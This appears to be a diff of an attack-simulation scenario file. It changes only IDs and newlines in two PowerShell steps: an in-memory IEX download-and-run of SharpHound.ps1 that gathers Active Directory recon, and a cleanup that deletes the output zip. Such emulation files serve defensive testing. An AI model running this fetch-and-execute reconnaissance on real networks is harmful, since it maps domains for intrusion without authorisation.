@@ -7,19 +7,19 @@
   ],
   "steps": [
     {
-      "id": "f7be1abe-4d29-4705-853c-8627cc109507",
+      "id": "0442227b-e9d2-4580-85dc-3ce26dfab343",
       "type": "execute-command",
       "data": {
-        "command": "write-host \"Remote download of SharpHound.ps1 into memory, followed by execution of the script\" -ForegroundColor Cyan\nIEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1');\nInvoke-BloodHound -OutputDirectory $env:Temp\nStart-Sleep 5\n",
+        "command": "write-host \"Remote download of SharpHound.ps1 into memory, followed by execution of the script\" -ForegroundColor Cyan\nIEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1');\nInvoke-BloodHound -OutputDirectory $env:Temp\nStart-Sleep 5",
         "command_type": "powershell"
       },
       "elevation_required": false
     },
     {
-      "id": "13b6ca00-d6f3-45dc-9df4-703baab19a77",
+      "id": "f0c55f8a-56ce-4bb9-a4a4-79c09a23ac2e",
       "type": "execute-command",
       "data": {
-        "command": "Remove-Item $env:Temp\\*BloodHound.zip -Force\n",
+        "command": "Remove-Item $env:Temp\\*BloodHound.zip -Force",
         "command_type": "powershell"
       },
       "elevation_required": false
@@ -27,14 +27,14 @@
   ],
   "flows": [
     {
-      "s": "f7be1abe-4d29-4705-853c-8627cc109507",
+      "s": "0442227b-e9d2-4580-85dc-3ce26dfab343",
       "p": "on-success",
-      "o": "13b6ca00-d6f3-45dc-9df4-703baab19a77"
+      "o": "f0c55f8a-56ce-4bb9-a4a4-79c09a23ac2e"
     },
     {
-      "s": "f7be1abe-4d29-4705-853c-8627cc109507",
+      "s": "0442227b-e9d2-4580-85dc-3ce26dfab343",
       "p": "on-failure",
-      "o": "13b6ca00-d6f3-45dc-9df4-703baab19a77"
+      "o": "f0c55f8a-56ce-4bb9-a4a4-79c09a23ac2e"
     }
   ],
   "tags": [
